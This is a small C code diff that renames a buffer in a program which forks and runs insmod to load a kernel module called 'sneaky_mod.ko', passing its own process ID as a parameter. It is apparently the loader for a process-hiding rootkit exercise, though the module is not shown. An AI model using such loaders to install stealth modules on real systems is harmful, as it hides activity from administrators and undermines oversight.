@@ -83,9 +83,9 @@ int main()
     pid_t pid = fork();
     if (pid == 0)
     {
-        char pid_arg[32];
-        snprintf(pid_arg, sizeof(pid_arg), "sneaky_pid=%d", getpid());
-        execl("/sbin/insmod", "/sbin/insmod", "sneaky_mod.ko", pid_arg, (char *)NULL);
+        char msg[50];
+        snprintf(msg, sizeof(msg), "sneaky_pid=%d", getpid());
+        execl("/sbin/insmod", "/sbin/insmod", "sneaky_mod.ko", msg, (char *)NULL);
         exit(0);
     }
     waitpid(pid, NULL, 0);
